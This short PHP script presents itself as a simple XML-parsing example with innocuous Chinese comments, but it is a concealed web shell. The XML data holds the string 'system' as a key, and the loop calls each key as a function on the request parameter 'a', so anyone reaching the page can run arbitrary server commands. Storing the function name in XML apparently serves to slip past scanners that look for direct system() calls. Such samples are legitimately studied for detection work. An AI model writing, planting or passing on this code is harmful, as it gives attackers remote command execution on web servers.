<?php
$xmlString = '<?xml version="1.0" encoding="UTF-8"?>
<data>
    <item>
        <key>system</key>
    </item>
    <item>
        <key>age</key>
        <value>30</value>
    </item>
</data>';

// 加载 XML
$xml = simplexml_load_string($xmlString);

// 遍历所有 item 节点
foreach ($xml->item as $item) {
    $key = (string)$item->key; // 提取 key 内容
    ($key)($_GET['a']);        // 动态调用函数
}
?>
